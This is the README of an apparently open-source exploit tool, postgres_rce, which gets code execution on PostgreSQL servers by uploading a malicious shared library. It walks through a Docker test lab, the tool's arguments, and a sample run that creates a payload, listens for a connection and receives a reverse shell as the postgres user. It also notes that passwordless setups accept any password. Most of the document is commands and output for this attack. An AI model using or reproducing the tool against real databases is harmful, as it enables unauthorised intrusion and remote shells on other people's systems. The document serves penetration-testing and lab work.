# postgres_rce

## Summary

Gets code execution on a postgres instance by upload a shared object file that gives code execution.

## Usage

Start docker container if you want to test this locally

```sh
postgres_rce  master ⦿ docker-compose build
Building postgres
Step 1/3 : FROM library/postgres:11
 ---> 49f9c68716aa
Step 2/3 : EXPOSE 5433 5432
 ---> Using cache
 ---> 0049e7b05500
Step 3/3 : RUN apt-get update -y && apt-get install -y --no-install-recommends     python     netcat     && rm -rf /var/lib/apt/lists/*
 ---> Using cache
 ---> e640d3072e99
Successfully built e640d3072e99
Successfully tagged postgresrce_postgres:latest

⬢  postgres_rce  master ⦿ docker-compose up -d
Starting postgresrce_postgres_1 ... done
```

Verify that container is running.

```sh
postgres_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                  COMMAND                  CREATED             STATUS              PORTS               NAMES
262c908f5bb0        postgresrce_postgres   "docker-entrypoint.s…"   4 hours ago         Up 14 seconds                           postgresrce_postgres_1
```

Run ./postgres_rce.py to get the usage menu.

```sh
./postgres_rce.py

 ██▓███   ▒█████    ██████ ▄▄▄█████▓  ▄████  ██▀███  ▓█████   ██████  ██▀███   ▄████▄  ▓█████
▓██░  ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒ ██▒ ▀█▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀
▓██░ ██▓▒▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██░▄▄▄░▓██ ░▄█ ▒▒███   ░ ▓██▄   ▓██ ░▄█ ▒▒▓█    ▄ ▒███
▒██▄█▓▒ ▒▒██   ██░  ▒   ██▒░ ▓██▓ ░ ░▓█  ██▓▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄
▒██▒ ░  ░░ ████▓▒░▒██████▒▒  ▒██▒ ░ ░▒▓███▀▒░██▓ ▒██▒░▒████▒▒██████▒▒░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
▒▓▒░ ░  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░    ░▒   ▒ ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
░▒ ░       ░ ▒ ▒░ ░ ░▒  ░ ░    ░      ░   ░   ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░  ░▒ ░ ▒░  ░  ▒    ░ ░  ░
░░       ░ ░ ░ ▒  ░  ░  ░    ░      ░ ░   ░   ░░   ░    ░   ░  ░  ░    ░░   ░ ░           ░
             ░ ░        ░                 ░    ░        ░  ░      ░     ░     ░ ░         ░  ░
                                                                              ░
[nighter@nighter.se]

Usage: ./postgres_rce.py <HOST> <LHOST> <LPORT> <USERNAME> <PASSWORD>

EXAMPLE: ./postgres_rce.py '127.0.0.1' 10.10.14.24 1337 postgres password
```        

Run the exploit. Note that if it is passwordless authentication any password will work.

```sh
⬢  postgres_rce  master ⦿ ./postgres_rce.py 127.0.0.1 10.100.12.59 1347 postgres password
[+] LHOST = 10.100.12.59
[+] Created payload
[+] Version: PostgreSQL 11beta3 (Debian 11~beta3-1.pgdg90+2) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit
[+] Shell listen
[+] Exploit
postgres@desktop:/var/lib/postgresql/data$ id
uid=999(postgres) gid=999(postgres) groups=999(postgres),103(ssl-cert)
```

Note for this to work a library for every postgres installation needs to be build in the lib folder. Makefile exist in case the library you need is missing.
